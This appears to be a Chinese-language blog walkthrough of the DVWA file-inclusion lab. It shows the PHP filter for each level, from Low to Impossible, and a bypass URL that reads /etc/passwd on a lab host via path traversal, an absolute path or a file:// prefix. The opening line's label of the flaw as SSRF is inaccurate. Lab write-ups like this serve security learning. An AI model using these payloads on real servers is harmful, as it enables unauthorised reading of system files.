---
title: "DVWA File Inclusion 過關秘籍"
date: 2020-04-13
description: "梳理 DVWA 文件包含 Low、Medium、High、Impossible 四檔源碼中的過濾邏輯與繞過方式,涵蓋絕對路徑直接讀取、str_replace 殘留字符繞過、文件傳輸協議前綴以及白名單強匹配等典型利用手法,並討論各自適用條件與在實際防禦中的權衡取捨。"
tags: ["思考"]
author: sdttttt
draft: false
cover:
  image: "images/covers/20200413-DVWA-File-Inclusion-過關秘籍-172j.svg"
  alt: ""
  hidden: false
aliases: ["/posts/2020041304grjt/"]
language: "zh-tw"
---

是一種`SSRF`漏洞

###

### Low

```php
// 非常單純, 隨便讀取
// http://192.168.32.114/vulnerabilities/fi/?page=../../../../../../etc/passwd
// The page we wish to display
$file = $_GET[ 'page' ];
```

###

### Medium

```php
// The page we wish to display
$file = $_GET[ 'page' ];

// 過濾一部分字符
// 不允許 HTTP,HTTPS 協議
// 利用目錄結構讀取也不行

// 然而沒有過濾全
// http://192.168.32.114/vulnerabilities/fi/?page=/etc/passwd

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );
```

###

### High

```php
// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
// 對$file 字符串做匹配
// 只能匹配 file* 的文件路徑
// 還有 include.php 文件路徑

// 這個過濾還是八星
// 利用`本地文件傳輸協議`
// http://192.168.32.114/vulnerabilities/fi/?page=file:///etc/passwd

// 或者這樣
// http://192.168.32.114/vulnerabilities/fi/?page=file123123/../../../../../../etc/passwd

if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}
```

###

### Impossible

```php
// The page we wish to display
$file = $_GET[ 'page' ];

// Only allow include.php or file{1..3}.php
// 強匹配
// 從程序員的角度來說這種代碼的維護性極差
// 從安全的角度上來說這是最安全的方案
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}
```
